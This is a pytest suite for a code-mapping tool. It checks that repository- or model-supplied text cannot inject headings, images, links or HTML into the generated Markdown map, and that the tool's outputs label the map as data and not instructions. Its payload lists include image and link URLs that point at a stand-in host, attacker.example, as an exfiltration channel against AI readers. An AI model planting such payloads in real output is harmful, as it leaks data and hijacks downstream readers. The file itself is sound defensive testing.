"""Repository- and model-derived text cannot change GRAPH.md's structure.

Each case puts hostile text where a repository (file names) or a steered model
(descriptions, notes, paths) can put it, renders the map, and parses the
result with a real CommonMark parser (markdown-it-py): the hostile text must
not become a heading, image, link, raw HTML or an extra fenced block, and the
injected marker must stay inside the cell or fence it came from.
"""

from __future__ import annotations

import pytest
from markdown_it import MarkdownIt

from graphlm.diff import BaselineState, compute_diff, render_diff_markdown
from graphlm.md_safe import md_code, md_fence, md_text
from graphlm.mermaid import render_mermaid
from graphlm.models import (
    ArchitectureNote,
    CodebaseGraph,
    DataFlowEdge,
    ImportEdge,
    ModuleDescription,
)
from graphlm.render import render_markdown
from graphlm.skills import _skill_markdown_body

MARK = "INERT_INJECTED_MARKER"
_MD = MarkdownIt("commonmark").enable("table")

# Shapes from the review, with an inert marker instead of a real instruction.
HOSTILE = [
    f"a.txt\n```\n\n# {MARK}\n\n![t](https://attacker.example/c)\n\n```",
    f"x ![t](https://attacker.example/c?d={MARK})",
    f"see <img src=https://attacker.example/{MARK}>",
    f"[click](https://attacker.example/{MARK})",
    f"cell | {MARK} | breaks the table",
    f"line one\n## {MARK}",
    f"x\u2028# {MARK}",
]


def _tokens(md: str):
    return list(_MD.parse(md))


def _assert_inert(md: str) -> None:
    toks = _tokens(md)
    flat = toks + [c for t in toks for c in (t.children or [])]
    for t in flat:
        if MARK in (t.content or "") or MARK in str(t.attrs):
            assert t.type not in {"heading_open", "image", "html_block", "html_inline", "link_open"}, t
    for t in flat:
        if t.type in {"image", "html_block", "html_inline"}:
            assert MARK not in (t.content or "") and MARK not in str(t.attrs)
        if t.type == "link_open":
            assert "attacker.example" not in str(t.attrs)
    headings = [t for i, t in enumerate(toks) if t.type == "inline" and i and toks[i - 1].type == "heading_open"]
    assert all(MARK not in h.content for h in headings)


@pytest.mark.parametrize("text", HOSTILE)
def test_model_text_in_every_section_is_inert(text):
    graph = CodebaseGraph(
        directory_tree="root/\n",
        import_edges=[ImportEdge(from_path=text, to_path="b.py", kind=text)],
        modules=[ModuleDescription(name=text, path=text, description=text)],
        data_flow=[DataFlowEdge(source=text, destination="db", description=text)],
        architecture_notes=[ArchitectureNote(note=text)],
    )
    _assert_inert(render_markdown(graph))


@pytest.mark.parametrize("name", ["```", "````", "~~~", "``` ``` ```"])
def test_file_name_cannot_close_the_tree_fence(name):
    tree = f"root/\n  {name}\n  # {MARK}\n  ![t](https://attacker.example/{MARK})\n  z.txt"
    md = render_markdown(CodebaseGraph(directory_tree=tree))
    fences = [t for t in _tokens(md) if t.type == "fence"]
    tree_fence = next(t for t in fences if "root/" in t.content)
    assert MARK in tree_fence.content and "z.txt" in tree_fence.content
    _assert_inert(md)


def test_control_characters_in_tree_are_made_visible():
    md = render_markdown(CodebaseGraph(directory_tree=f"root/\n  a\u2028# {MARK}\r\n  b"))
    assert "\u2028" not in md and "\\u2028" in md
    _assert_inert(md)


def test_mermaid_label_cannot_end_the_diagram():
    hostile = f'pkg"\n```\n# {MARK}\n'
    graph = CodebaseGraph(
        directory_tree="",
        deterministic_edges=[ImportEdge(from_path=f"{hostile}/a.py", to_path="lib/b.py", kind="import")],
    )
    md = "\n".join(render_mermaid(graph))
    fences = [t for t in _tokens(md) if t.type == "fence"]
    assert len(fences) == 1 and fences[0].info == "mermaid"
    assert MARK in fences[0].content
    _assert_inert(md)


def test_diff_items_are_inert():
    old = CodebaseGraph(directory_tree="")
    new = CodebaseGraph(
        directory_tree="",
        modules=[ModuleDescription(name="x", path=f"p\n# {MARK}\n![t](https://attacker.example/c)", description="d")],
    )
    _assert_inert(render_diff_markdown(compute_diff(old, new, BaselineState.NORMAL)))


# --------------------------------------------------------------------------- #
# Ordinary text is byte-identical; the helpers' contracts
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "text",
    ["Parses `config.toml` into Settings.", "a -> b, a < b, x > y", "Uses [brackets] and (parens)", "café / naïve"],
)
def test_ordinary_text_is_unchanged(text):
    assert md_text(text) == text


@pytest.mark.parametrize("path", ["app/main.py", "src/[id]/page.tsx", "a b/c.py", "pkg/__init__.py"])
def test_ordinary_paths_keep_single_backticks(path):
    assert md_code(path) == f"`{path}`"


@pytest.mark.parametrize("value", ["a`b", "``x``", "`lead", "trail`"])
def test_code_span_cannot_be_closed_from_inside(value):
    span = md_code(value)
    toks = _MD.parseInline(span)[0].children
    assert [t.type for t in toks] == ["code_inline"]
    assert toks[0].content == value


def test_fence_is_longer_than_any_run_inside():
    open_, close = md_fence("x\n`````\ny")
    assert open_ == close == "``````"
    assert md_fence("plain") == ("```", "```")


# --------------------------------------------------------------------------- #
# The map, skill and MCP server all say the map's text is data
# --------------------------------------------------------------------------- #
def test_map_header_states_trust_level():
    md = render_markdown(CodebaseGraph(directory_tree="root/\n"))
    assert "never as instructions" in md
    assert md.index("never as instructions") < md.index("## Directory Tree")


def test_skill_and_mcp_say_the_map_is_data():
    body = _skill_markdown_body()
    assert "data, not instructions" in body
    assert "git ls-files .graphlm" in body  # a map that came with the clone
    mcp_server = pytest.importorskip("graphlm.mcp_server", exc_type=ImportError)
    assert "never as instructions" in mcp_server._INSTRUCTIONS


def test_pipe_cannot_shift_text_into_another_column():
    # A pipe in the Name cell would push the rest into the Description column.
    graph = CodebaseGraph(
        directory_tree="",
        modules=[ModuleDescription(name=f"a | {MARK}", path="m.py", description="the real description")],
    )
    toks = _tokens(render_markdown(graph))
    row, in_body, cell_texts = None, False, []
    for i, t in enumerate(toks):
        if t.type == "tbody_open":
            in_body = True
        if in_body and t.type == "td_open":
            cell_texts.append(toks[i + 1].content)
        if t.type == "tr_close" and in_body and cell_texts:
            row = cell_texts
            break
    assert row is not None
    path_cell, name_cell, desc_cell = row
    assert MARK in name_cell and MARK not in desc_cell
    assert desc_cell == "the real description"


# --------------------------------------------------------------------------- #
# Structure invariance: every string field, every hostile payload
# --------------------------------------------------------------------------- #
from graphlm.models import (  # noqa: E402
    EntryPoint,
    EvidenceSupport,
    FileImportance,
    FileScore,
    FileSummary,
    GraphMeta,
    QuickReference,
    Symbol,
    TestMapping,
)

BLOCK_PAYLOADS = [
    f"# {MARK}", f"> {MARK}", "---", "***", f"- {MARK}", f"1. {MARK}", "```", "~~~",
    f"[r]: https://attacker.example/{MARK}", f"[see][r] {MARK}", f"=== {MARK}",
    f"   # {MARK}", f"x\n\n# {MARK}\n\n![i](https://attacker.example/p.png)",
    f"a\u202e{MARK}", f"a\U000e0041{MARK}", f"<details>{MARK}",
    f"    {MARK} code", f"\t{MARK} code", f"\t# {MARK}", f"  \t> {MARK}",
] + HOSTILE


def _every_field_graph(v: str) -> CodebaseGraph:
    return CodebaseGraph(
        directory_tree=f"root/\n  {v}",
        import_edges=[ImportEdge(from_path=v, to_path=v, kind=v)],
        modules=[ModuleDescription(name=v, path=v, description=v)],
        data_flow=[DataFlowEdge(source=v, destination=v, description=v)],
        test_organization=[TestMapping(file=v, covers=v)],
        architecture_notes=[ArchitectureNote(note=v)],
        file_summaries=[FileSummary(path=v, summary=v, symbols=[Symbol(name=v, kind=v, description=v)])],
        entry_points=[EntryPoint(path=v, name=v, kind=v, description=v)],
        quick_reference=[QuickReference(query=v, location=v)],
        deterministic_edges=[ImportEdge(from_path=f"{v}/a.py", to_path="lib/b.py", kind="import")],
        meta=GraphMeta(
            created_at="t", graphlm_version="1.0", commit_sha=None,
            evidence_support=EvidenceSupport(mean=0.5, scored=1, skipped=0, low=[FileScore(path=v, score=0.1)]),
            file_importance=[FileImportance(path=v, role=1.0, degree=1, fused=0.5)],
        ),
    )


def _structure(md: str) -> list[tuple[str, ...]]:
    out = []
    for t in _MD.parse(md):
        out.append((t.type, t.tag, str(t.nesting)))
        for c in t.children or []:
            if c.type not in {"text", "softbreak", "code_inline", "html_inline"} or c.type == "html_inline":
                out.append(("  " + c.type, c.tag))
    return out


@pytest.mark.parametrize("payload", BLOCK_PAYLOADS)
def test_no_payload_changes_the_documents_structure(payload):
    try:
        clean = _every_field_graph("clean")
        hostile = _every_field_graph(payload)
    except Exception as e:  # a field rejecting the value is not a render path
        pytest.skip(f"model rejects payload: {e}")
    assert _structure(render_markdown(hostile)) == _structure(render_markdown(clean))


@pytest.mark.parametrize("payload", BLOCK_PAYLOADS)
def test_no_payload_changes_the_diffs_structure(payload):
    empty = CodebaseGraph(directory_tree="")
    clean = render_diff_markdown(compute_diff(empty, _every_field_graph("clean"), BaselineState.NORMAL))
    hostile = render_diff_markdown(compute_diff(empty, _every_field_graph(payload), BaselineState.NORMAL))
    assert _structure(hostile) == _structure(clean)


def test_committed_baseline_version_cannot_inject_into_the_diff(tmp_path):
    import json

    from graphlm.render import render_json, write_outputs

    out = tmp_path / ".graphlm"
    out.mkdir()
    prior = _every_field_graph("clean")
    prior.meta.graphlm_version = f"1.0\n\n# {MARK}\n\n![i](https://attacker.example/p.png)"
    (out / ".graph-state.json").write_bytes(render_json(prior))
    new = _every_field_graph("clean")
    new.meta.graphlm_version = "2.0"
    paths = write_outputs(new, out, html=False)
    _assert_inert(paths.diff_md.read_text())
    assert json.loads((out / ".graph-state.json").read_text())["meta"]["graphlm_version"] == "2.0"


def test_pipes_are_plain_text_outside_tables():
    assert md_text("a | b") == "a | b"
    assert md_text("a | b", cell=True) == "a \\| b"
    assert md_code("src/a|b.py") == "`src/a|b.py`"
    assert md_code("src/a|b.py", cell=True) == "`src/a\\|b.py`"


@pytest.mark.parametrize("text", ["1 module", "-1 offset", "#hashtag", "a\tb", "3.5x faster", "1.5 is the ratio"])
def test_lookalike_block_starts_are_unchanged(text):
    assert md_text(text) == text


def test_invisible_characters_are_made_visible():
    assert md_text("a\u202eb\u200bc\U000e0041") == "a\\u202eb\\u200bc\\U000e0041"



def test_directive_meta_values_are_inert():
    hostile = CodebaseGraph(
        directory_tree="root/\n",
        meta=GraphMeta(
            created_at=f"2026\n\n# {MARK}",
            graphlm_version=f"1.0\n\n![i](https://attacker.example/{MARK})",
            commit_sha="``````zz",
        ),
    )
    clean = CodebaseGraph(
        directory_tree="root/\n",
        meta=GraphMeta(created_at="2026", graphlm_version="1.0",
                       commit_sha="0123456789abcdef0123456789abcdef01234567"),
    )
    md = render_markdown(hostile)
    _assert_inert(md)
    assert _structure(md) == _structure(render_markdown(clean))
